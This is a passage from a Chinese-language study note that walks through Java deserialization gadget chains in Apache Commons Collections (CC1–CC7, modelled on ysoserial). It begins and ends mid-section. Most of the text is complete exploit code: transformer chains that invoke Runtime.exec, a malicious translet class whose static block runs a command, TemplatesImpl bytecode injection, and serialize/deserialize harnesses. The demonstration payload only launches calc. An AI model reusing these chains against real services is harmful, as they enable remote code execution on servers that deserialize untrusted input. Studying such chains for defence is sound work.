ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
chainedTransformer.transform(Runtime.class);
```
- 接下来看过判断，`memberType` 接受键值对并首先获取 `key`，然后在 `Class<?>` 里查询有无这个键，有的话才能过第一个判断，然后 aaa 肯定不能强制转化。    

![](../assets/屏幕截图%202024-11-04%20090512.png)

- 解决方法 2
```Java
HashMap<Object,Object> map = new HashMap<>();  
map.put("value","aaa");  
Map<Object,Object> tranformedMap = TransformedMap.decorate(map,null,chainedTransformer);
```
- 继续跟进查看如何解决问题 3，看到 `ConstantTransformer` 可以利用。    

![](../assets/屏幕截图%202024-11-04%20093610.png)
![](../assets/屏幕截图%202024-11-04%20093713.png)

- 解决方法 3
```Java
Transformer[] transformers = new Transformer[]{  
        new ConstantTransformer(Runtime.class),  
        new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),  
        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),  
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})  
};
```
### 构造链
```TEXT
AnnotationInvocationHandler.readObject() -> (Map.Entry)TransformedMap.setValue -> ChainedTransformer.transform() -> ConstantTransformer.transform() -> InvokerTransformer.transform()（执行类） -> r.exec()（危险方法调用）
```
### 补充分析（解决方法 3）
```Java
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
```
- 当传入的参数是一个数组时，它会循环读取，对每个参数都调用 `transform()`，从而构造出一条链出来。    

![](../assets/屏幕截图%202024-11-09%20182705.png])

### 最终利用链
```Java  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
  
import java.io.*;  
import java.lang.annotation.Target;  
import java.lang.reflect.Constructor;    
import java.util.HashMap;  
import java.util.Map;  
  
public class CC1Test {  
    public static void main(String[] args) throws Exception {  

        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),  
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),  
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  

        HashMap<Object,Object> map = new HashMap<>();  
        map.put("value","aaa");  
        Map<Object,Object> tranformedMap = TransformedMap.decorate(map,null,chainedTransformer);  
  
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
        Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class);  
        annotationInvocationHandlerConstructor.setAccessible(true);  
        Object o = annotationInvocationHandlerConstructor.newInstance(Target.class,tranformedMap);  
        serialize(o);  
        unserialize("F:\\Code\\Java Project\\CCTest\\src\\main\\java\\org\\example\\ser.bin");  
    }  
  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("F:\\Code\\Java Project\\CCTest\\src\\main\\java\\org\\example\\ser.bin"));  
        oos.writeObject(obj);  
    }  
  
    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));  
        Object obj = ois.readObject();  
        return obj;  
    }  
}
```
## CommonsCollections-1 链（2）
- 我们去看 `ysoserial` 中的 CC1 链，发现它并不是使用这种方法，在 `ChainedTransformer` 之前是使用 `LazyMap` 来构造链。    
```TEXT
/*
	Gadget chain:
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()
 */
```
### 构造链
```TEXT
AnnotationInvocationHandler.readObject()【memberValues=Proxy】 -> Proxy(annotationInvocationHandle).xxx【memberValues=LazyMap】 -> LazyMap.get() -> ChainedTransformer.transform() -> ConstantTransformer.transform() -> InvokerTransformer.transform()（执行类） -> r.exec()（危险方法调用）
```
### 细节分析
- 我们发现 `LazyMap` 中也调用了 `transform()`，且前面的 `factory` 是可控的，我们可以通过传入 `ChainedTransformer` 来调用 `ChainedTransformer.transform()`。    

![](../assets/屏幕截图%202024-11-09%20183907.png)

- 因为 `LazyMap` 方法是 `protect` 方法，不能直接外部调用，只能够类内调用，所以我们需要通过 `LazyMap.decorate()` 来实现对 `factory` 的传参。    

![](../assets/屏幕截图%202024-11-09%20184334.png)

- 我们看到 `AnnotationInvocationHandler` 的 `invoke` 方法中有调用 `get()`，且 `memberValues` 受控。    

![](../assets/屏幕截图%202024-11-09%20185004.png)
![](../assets/屏幕截图%202024-11-09%20190509.png)

- 然后，进行动态代理，调用 `AnnotationInvocationHandler` 的 `invoke` 方法。    
> `Proxy.newProxyInstance` 方法用于创建一个代理对象。    
>这个方法接收三个参数，第一个参数 `LazyMap.class.getClassLoader()` 是指定代理对象的类加载器，这里使用了 `LazyMap` 类的类加载器。    
>第二个参数 `new Class[]{Map.class}` 是一个 Class 数组，指定代理对象要实现的接口，这里指定为 `Map` 接口，意味着创建的代理对象将表现得像一个实现了 `Map` 接口的对象。    
>第三个参数 `h` 是一个 `InvocationHandler` 接口的实现对象，它定义了代理对象的方法调用逻辑。每当通过代理对象调用方法时，这个 `InvocationHandler` 的 `invoke` 方法会被调用，在这里可以对方法调用进行拦截和自定义处理。    
- 最后实例化，序列化即可。    
### 最终利用链
```Java
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.LazyMap;   
    
import java.io.*;    
import java.lang.reflect.Constructor;  
import java.lang.reflect.InvocationHandler;    
import java.lang.reflect.Proxy;  
import java.util.HashMap;  
import java.util.Map;  
  
public class CC1Test {  
    public static void main(String[] args) throws Exception {  
    
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),  
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),  
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
   
        HashMap<Object,Object> map = new HashMap<>();    
        Map<Object,Object> lazymap = LazyMap.decorate(map,chainedTransformer);  
  
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
        Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class);  
        annotationInvocationHandlerConstructor.setAccessible(true);  
        InvocationHandler h = (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class,lazymap);  
        
        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h);  
        Object o = annotationInvocationHandlerConstructor.newInstance(Override.class,mapProxy);  
        // serialize(o);  
        unserialize("F:\\Code\\Java Project\\CCTest\\src\\main\\java\\org\\example\\ser.bin");  
    }  
  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("F:\\Code\\Java Project\\CCTest\\src\\main\\java\\org\\example\\ser.bin"));  
        oos.writeObject(obj);  
    }  
  
    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));  
        Object obj = ois.readObject();  
        return obj;  
    }  
}
```
## CommonsCollections-6 链
- 看看 `ysoserial` 的构造链。    
```TEXT
/*
	Gadget chain:
	    java.io.ObjectInputStream.readObject()
            java.util.HashSet.readObject()
                java.util.HashMap.put()
                java.util.HashMap.hash()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                        org.apache.commons.collections.map.LazyMap.get()
                            org.apache.commons.collections.functors.ChainedTransformer.transform()
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()

    by @matthias_kaiser
*/
```
### 构造链
```TEXT
HashSet.readObject() -> TiedMapEntry.hashCode() -> LazyMap.get() -> ChainedTransformer.transform() -> ConstantTransformer.transform() -> InvokerTransformer.transform()（执行类） -> r.exec()（危险方法调用）
```
### 细节分析

### 最终利用链
```Java
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.keyvalue.TiedMapEntry;  
import org.apache.commons.collections.map.LazyMap;  
  
import java.io.*;  
import java.lang.reflect.Field;  
import java.util.HashMap;  
import java.util.Map;  
  
public class CC6Test {  
    public static void main(String[] args) throws Exception {  
  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),  
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),  
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
  
        HashMap<Object,Object> map = new HashMap<>();  
        Map<Object,Object> lazyMap = LazyMap.decorate(map,new ConstantTransformer(1));  
  
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"aaa");  
  
        HashMap<Object,Object> map2 = new HashMap<>();  
        map2.put(tiedMapEntry,"bbb");  
        lazyMap.remove("aaa");  
  
        Class c = LazyMap.class;  
        Field factoryField = c.getDeclaredField("factory");  
        factoryField.setAccessible(true);  
        factoryField.set(lazyMap,chainedTransformer);  
  
        // serialize(map2);  
        unserialize("F:\\Code\\Java Project\\CCTest\\src\\main\\java\\org\\example\\ser2.bin");  
  
    }  
  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("F:\\Code\\Java Project\\CCTest\\src\\main\\java\\org\\example\\ser2.bin"));  
        oos.writeObject(obj);  
    }  
  
    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));  
        Object obj = ois.readObject();  
        return obj;  
    }  
  
}
```
## CommonsCollections-3 链
- 另一种命令执行，动态类加载。   
### 构造链
```TEXT
AnnotationInvocationHandler.readObject() -> (Map.Entry)TransformedMap.setValue -> ChainedTransformer.transform() -> InstantiateTransformer -> TrAXFilter.TrAXFilter -> TemplatesImpl.newTransformer() -> defineClass -> newInstance
```
### 细节分析
- 我们想要调用 `defineClass` 就必须找到一个不是 `protected` 的 `defineClass` 去进行重写。    

![](../assets/屏幕截图%202024-11-10%20094713.png)

- 我们找到 `TemplatesImpl` 中调用了 `defineClass`，但是它没有定义作用域，所以这还是一个 `protected` 方法，我们还要继续往上找。    

![](../assets/屏幕截图%202024-11-10%20095138.png)

- 我们再看到 `defineTransletClasses` 调用了 `defineClass`，但它还是私有方法，继续找。    

![](../assets/屏幕截图%202024-11-10%20100445.png)

- 然后我们看到 `getTransletInstance()` 调用了 `defineTransletClasses`，且有 `newInstance()`，所以只要走完这个方法，就能实例化恶意类，然后命令执行。    

![](../assets/屏幕截图%202024-11-10%20100039.png)

- 而 `_class` 的赋值则是在 `defineTransletClasses` 中实现的。    

![](../assets/屏幕截图%202024-11-10%20102049.png)

- 然后，再去找谁调用了 `getTransletInstance()`，我们就看到 `newTransformer()` 中调用了它，而且还是 `public` 方法，我们就可以用这个来构造链。    

![](../assets/屏幕截图%202024-11-10%20102251.png)

- 因为需要走完这个方法，所以要过 if 判断，所以这里的 `_name` 不能为空，`_class` 要为空，因为我们要调用 `defineTransletClasses()`。    

![](../assets/屏幕截图%202024-11-10%20103524.png)

- 这里有一个对类的父类的一个判断，如果传入的类的父类不是指定的类，它走不到判断中，它的 `_transletIndex` 的值就会是-1，那么在后面的一个判断就会报错，我们的调用就不能继续正常进行下去。    

![](../assets/屏幕截图%202024-11-10%20104814.png)

- 然后，继续寻找调用了 `newTransformer()` 的类，我们就找到了 `TrAXFilter`，之后要想办法控制 `templates`。        

![](../assets/屏幕截图%202024-11-10%20105441.png)

- 然后，它用了 `InstantiateTransformer` 来实例化 `TrAXFilter`。    

![](../assets/屏幕截图%202024-11-10%20105935.png)

- 之后的构造就和 CC1 链，或者其他链（有 `transform` 的）的调用就一样了。    
### 另一种命令执行
- 恶意类代码。    
```Java
package org.example;  
  
import java.io.IOException;  
  
import com.sun.org.apache.xalan.internal.xsltc.DOM;  
import com.sun.org.apache.xalan.internal.xsltc.TransletException;  
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;  
  
public class Test extends AbstractTranslet{  
    static {  
        try {  
            Runtime.getRuntime().exec("calc");  
        } catch (IOException e) {  
            throw new RuntimeException(e);  
        }  
    }  
  
    public static void main(String[] args) {  
        System.out.println("Success!");  
    }  
  
    @Override  
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {  
  
    }  
  
    @Override  
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {  
  
    }  
  
}
```
- 利用。    
```Java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
  
import javax.xml.transform.TransformerConfigurationException;  
import java.io.*;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.time.temporal.Temporal;  
import java.lang.reflect.Field;  
  
public class CC3Test {  
    public static void main(String[] args) throws Exception {  
  
        TemplatesImpl templates = new TemplatesImpl();  
  
        Class tc = templates.getClass();  
  
        Field nameField = tc.getDeclaredField("_name");  
        nameField.setAccessible(true);  
        nameField.set(templates,"aaaa");  
  
        Field bytecodesField = tc.getDeclaredField("_bytecodes");  
        bytecodesField.setAccessible(true);  
        byte[] code = Files.readAllBytes(Paths.get("F:\\Code\\Java Project\\CCTest\\target\\classes\\org\\example\\Test.class"));  
        byte[][] codes = {code};  
        bytecodesField.set(templates,codes);  
  
        Field tfactoryField = tc.getDeclaredField("_tfactory");  
        tfactoryField.setAccessible(true);  
        tfactoryField.set(templates,new TransformerFactoryImpl());  
        templates.newTransformer();  
    }  
  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("F:\\Code\\Java Project\\CCTest\\src\\main\\java\\org\\example\\ser2.bin"));  
        oos.writeObject(obj);  
    }  
  
    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));  
        Object obj = ois.readObject();  
        return obj;  
    }  
  
}
```
### 这种命令执行+反序列化 （CC1 链）
```Java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.LazyMap;  
  
import javax.xml.transform.TransformerConfigurationException;  
import java.io.*;  
import java.lang.reflect.*;  
import java.nio.file.Files;  
import java.nio.file.Paths;   
import java.util.HashMap;  
import java.util.Map;  
  
public class CC3Test {  
    public static void main(String[] args) throws Exception {  
  
        TemplatesImpl templates = new TemplatesImpl();  
  
        Class tc = templates.getClass();  
  
        Field nameField = tc.getDeclaredField("_name");  
        nameField.setAccessible(true);  
        nameField.set(templates,"aaaa");  
  
        Field bytecodesField = tc.getDeclaredField("_bytecodes");  
        bytecodesField.setAccessible(true);  
        byte[] code = Files.readAllBytes(Paths.get("F:\\Code\\Java Project\\CCTest\\target\\classes\\org\\example\\Test.class"));  
        byte[][] codes = {code};  
        bytecodesField.set(templates,codes);  
  
        Field tfactoryField = tc.getDeclaredField("_tfactory");  
        tfactoryField.setAccessible(true);  
        tfactoryField.set(templates,new TransformerFactoryImpl());  
//        templates.newTransformer();  
  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(templates),  
                new InvokerTransformer("newTransformer",null,null)  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
//        chainedTransformer.transform(1);  
  
        HashMap<Object,Object> map = new HashMap<>();  
        Map<Object,Object> lazymap = LazyMap.decorate(map,chainedTransformer);  
  
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
        Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class);  
        annotationInvocationHandlerConstructor.setAccessible(true);  
        InvocationHandler h = (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class,lazymap);  
  
        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h);  
        Object o = annotationInvocationHandlerConstructor.newInstance(Override.class,mapProxy);  
//        serialize(o);  
        unserialize("F:\\Code\\Java Project\\CCTest\\src\\main\\java\\org\\example\\ser3.bin");  
    }  
  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("F:\\Code\\Java Project\\CCTest\\src\\main\\java\\org\\example\\ser3.bin"));  
        oos.writeObject(obj);  
    }  
  
    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));  
        Object obj = ois.readObject();  
        return obj;  
    }  
  
}
```
### 利用链
```Java
package org.example;  
  
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InstantiateTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.LazyMap;  
  
import javax.xml.transform.Templates;  
import javax.xml.transform.TransformerConfigurationException;  
import java.io.*;  
import java.lang.reflect.*;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.time.temporal.Temporal;  
import java.util.HashMap;  
import java.util.Map;  
  
public class CC3Test {  
    public static void main(String[] args) throws Exception {  
  
        TemplatesImpl templates = new TemplatesImpl();  
  
        Class tc = templates.getClass();  
  
        Field nameField = tc.getDeclaredField("_name");  
        nameField.setAccessible(true);  
        nameField.set(templates,"aaaa");  
  
        Field bytecodesField = tc.getDeclaredField("_bytecodes");  
        bytecodesField.setAccessible(true);  
        byte[] code = Files.readAllBytes(Paths.get("F:\\Code\\Java Project\\CCTest\\target\\classes\\org\\example\\Test.class"));  
        byte[][] codes = {code};  
        bytecodesField.set(templates,codes);  
  
//        Field tfactoryField = tc.getDeclaredField("_tfactory");  
//        tfactoryField.setAccessible(true);  
//        tfactoryField.set(templates,new TransformerFactoryImpl()); 
//        templates.newTransformer();  
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});  
  
  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(TrAXFilter.class),  
                instantiateTransformer  
        };  
  
//        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});  
//        instantiateTransformer.transform(TrAXFilter.class);  
  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
//        chainedTransformer.transform(1);  
  
        HashMap<Object,Object> map = new HashMap<>();  
        Map<Object,Object> lazymap = LazyMap.decorate(map,chainedTransformer);  
  
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
        Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class);  
        annotationInvocationHandlerConstructor.setAccessible(true);  
        InvocationHandler h = (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class,lazymap);  
  
        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h);  
        Object o = annotationInvocationHandlerConstructor.newInstance(Override.class,mapProxy);  
//        serialize(o);  
        unserialize("F:\\Code\\Java Project\\CCTest\\src\\main\\java\\org\\example\\ser3.bin");  
    }  
  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("F:\\Code\\Java Project\\CCTest\\src\\main\\java\\org\\example\\ser3.bin"));  
        oos.writeObject(obj);  
    }  
  
    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));  
        Object obj = ois.readObject();  
        return obj;  
    }  
  
}
```
## CommonsCollections-4 链
### 准备
```TEXT
// 修改pom.xml文件，添加下列内容，针对CC4、CC2链
<dependency>  
    <groupId>org.apache.commons</groupId>  
    <artifactId>commons-collections4</artifactId>  
    <version>4.0</version>  
</dependency>
```
### 构造链
```TEXT
PriorityQueue -> TransformingComparator -> TemplatesImpl.newTransformer() -> defineClass -> newInstance
```
### 利用链
```Java  
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.comparators.TransformingComparator;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InstantiateTransformer;  
  
import javax.xml.transform.Templates;  
import javax.xml.transform.TransformerConfigurationException;  
import java.io.*;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.PriorityQueue;  
  
public class CC4Test {  
    public static void main(String[] args) throws Exception {  
  
        TemplatesImpl templates = new TemplatesImpl();  
  
        Class tc = templates.getClass();  
  
        Field nameField = tc.getDeclaredField("_name");  
        nameField.setAccessible(true);  
        nameField.set(templates,"aaaa");  
  
        Field bytecodesField = tc.getDeclaredField("_bytecodes");  
        bytecodesField.setAccessible(true);  
        byte[] code = Files.readAllBytes(Paths.get("F:\\Code\\Java Project\\CCTest\\target\\classes\\org\\example\\Test.class"));  
        byte[][] codes = {code};  
        bytecodesField.set(templates,codes);  
  
        Field tfactoryField = tc.getDeclaredField("_tfactory");  
        tfactoryField.setAccessible(true);  
        tfactoryField.set(templates,new TransformerFactoryImpl());  
        templates.newTransformer();  
  
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});  
  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(TrAXFilter.class),  
                instantiateTransformer  
        };  
  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));  
        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);  
//        chainedTransformer.transform(1);  
        priorityQueue.add(1);  
        priorityQueue.add(2);  
  
        Class c = transformingComparator.getClass();  
        Field transformerField = c.getDeclaredField("transformer");  
        transformerField.setAccessible(true);  
        transformerField.set(transformingComparator,chainedTransformer);  
  
        serialize(priorityQueue);  
        unserialize("F:\\Code\\Java Project\\CCTest\\src\\main\\java\\org\\example\\ser4.bin");  
    }  
  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("F:\\Code\\Java Project\\CCTest\\src\\main\\java\\org\\example\\ser4.bin"));  
        oos.writeObject(obj);  
    }  
  
    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));  
        Object obj = ois.readObject();  
        return obj;  
    }  
  
}
```
## CommonsCollections-2 链
### 构造链
```TEXT
/*
	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				...
					TransformingComparator.compare()
						InvokerTransformer.transform()
							Method.invoke()
								Runtime.exec()
 */
```
### 利用链
```Java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import org.apache.commons.collections4.comparators.TransformingComparator;  
import org.apache.commons.collections4.functors.ConstantTransformer;  
import org.apache.commons.collections4.functors.InvokerTransformer;  
  
import java.io.*;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.PriorityQueue;  
  
public class CC2Test {  
  
    public static void main(String[] args) throws Exception {  
  
        TemplatesImpl templates = new TemplatesImpl();  
  
        Class tc = templates.getClass();  
  
        Field nameField = tc.getDeclaredField("_name");  
        nameField.setAccessible(true);  
        nameField.set(templates,"aaaa");  
  
        Field bytecodesField = tc.getDeclaredField("_bytecodes");  
        bytecodesField.setAccessible(true);  
        byte[] code = Files.readAllBytes(Paths.get("F:\\Code\\Java Project\\CCTest\\target\\classes\\org\\example\\Test.class"));  
        byte[][] codes = {code};  
        bytecodesField.set(templates,codes);  
  
        InvokerTransformer<Object,Object> invokerTransformer = new InvokerTransformer<>("newTransformer",new Class[]{},new Object[]{});  
  
        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));  
  
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);  
//        chainedTransformer.transform(1);  
        priorityQueue.add(templates);  
        priorityQueue.add(2);  
  
        Class c = transformingComparator.getClass();  
        Field transformerField = c.getDeclaredField("transformer");  
        transformerField.setAccessible(true);  
        transformerField.set(transformingComparator,invokerTransformer);  
  
        serialize(priorityQueue);  
        unserialize("F:\\Code\\Java Project\\CCTest\\src\\main\\java\\org\\example\\ser5.bin");  
    }  
  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("F:\\Code\\Java Project\\CCTest\\src\\main\\java\\org\\example\\ser5.bin"));  
        oos.writeObject(obj);  
    }  
  
    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));  
        Object obj = ois.readObject();  
        return obj;  
    }  
}
```
## CommonsCollections-5 链
### 构造链
```TEXT
/*
	Gadget chain:
        ObjectInputStream.readObject()
            BadAttributeValueExpException.readObject()
                TiedMapEntry.toString()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()
 */
```
### 利用链
```Java
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.keyvalue.TiedMapEntry;  
import org.apache.commons.collections.map.LazyMap;  
  
import java.io.*;  
import java.lang.reflect.*;  
import java.util.HashMap;  
import java.util.Map;  
  
import javax.management.BadAttributeValueExpException;  
  
  
public class CC5Test {  
  
    public static void main(String[] args) throws Exception {  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),  
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),  
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
  
        HashMap<Object,Object> map = new HashMap<>();   
        Map<Object,Object> lazyMap = LazyMap.decorate(map,chainedTransformer);  
  
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "1");  
  
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);  
        Class c = val.getClass();  
        Field valField = c.getDeclaredField("val");  
        valField.setAccessible(true);  
        valField.set(val,entry);  
        
  
//        serialize(val);  
        unserialize("F:\\Code\\Java Project\\CCTest\\src\\main\\java\\org\\example\\ser6.bin");  
    }  
  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("F:\\Code\\Java Project\\CCTest\\src\\main\\java\\org\\example\\ser6.bin"));  
        oos.writeObject(obj);  
    }  
  
    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));  
        Object obj = ois.readObject();  
        return obj;  
    }  
  
}
```
## CommonsCollections-7 链
### 构造链
```TEXT
/*
    Payload method chain:

    java.util.Hashtable.readObject
    java.util.Hashtable.reconstitutionPut
    org.apache.commons.collections.map.AbstractMapDecorator.equals
    java.util.AbstractMap.equals
    org.apache.commons.collections.map.LazyMap.get
    org.apache.commons.collections.functors.ChainedTransformer.transform
    org.apache.commons.collections.functors.InvokerTransformer.transform
    java.lang.reflect.Method.invoke
    sun.reflect.DelegatingMethodAccessorImpl.invoke
    sun.reflect.NativeMethodAccessorImpl.invoke
    sun.reflect.NativeMethodAccessorImpl.invoke0
    java.lang.Runtime.exec
*/
```
### 利用链
```Java
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
